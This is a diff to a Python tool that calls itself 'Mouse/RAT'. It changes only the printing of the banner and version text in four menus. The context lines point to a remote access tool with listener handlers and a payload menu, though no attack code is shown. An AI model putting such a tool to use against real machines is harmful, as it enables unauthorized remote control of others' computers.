@@ -58,8 +58,9 @@ class mouse:
                 (((-'       __//  '--. /   Mouse/RAT
                           (((-'    __//
                                  (((-'
-"""+h.WHITE+"\nVersion: 1.6\nDeveloped by Entynetproject (Ivan Nikolsky)\n"+h.ENDC)
+"""+h.WHITE+"\nVersion: 1.6\nDeveloped by Entynetproject (Ivan Nikolsky)"+h.ENDC)
         print(h.WHITE+"-"*40)
+        print("")
         if not self.server.set_host_port():
             return
         self.server.start_single_handler()
@@ -79,8 +80,9 @@ class mouse:
                 (((-'       __//  '--. /   Mouse/RAT
                           (((-'    __//
                                  (((-'
-"""+h.WHITE+"\nVersion: 1.6\nDeveloped by Entynetproject (Ivan Nikolsky)\n"+h.ENDC)
+"""+h.WHITE+"\nVersion: 1.6\nDeveloped by Entynetproject (Ivan Nikolsky)"+h.ENDC)
         print(h.WHITE+"-"*40)
+        print("")
         if not self.server.set_host_port():
             return
         self.server.start_multi_handler()
@@ -123,8 +125,9 @@ class mouse:
                 (((-'       __//  '--. /   Mouse/RAT
                           (((-'    __//
                                  (((-'
-"""+h.WHITE+"\nVersion: 1.6\nDeveloped by Entynetproject (Ivan Nikolsky)\n"+h.ENDC)
+"""+h.WHITE+"\nVersion: 1.6\nDeveloped by Entynetproject (Ivan Nikolsky)"+h.ENDC)
         print(h.WHITE+"-"*40)
+        print("")
         exit()
 
 
@@ -142,8 +145,9 @@ class mouse:
                 (((-'       __//  '--. /   Mouse/RAT
                           (((-'    __//
                                  (((-'
-"""+h.WHITE+"\nVersion: 1.6\nDeveloped by Entynetproject (Ivan Nikolsky)\n"+h.ENDC)
+"""+h.WHITE+"\nVersion: 1.6\nDeveloped by Entynetproject (Ivan Nikolsky)"+h.ENDC)
         print(h.WHITE+"-"*40)
+        print("")
         number_option = 1
         for key in self.payloads:
             payload = self.payloads[key]
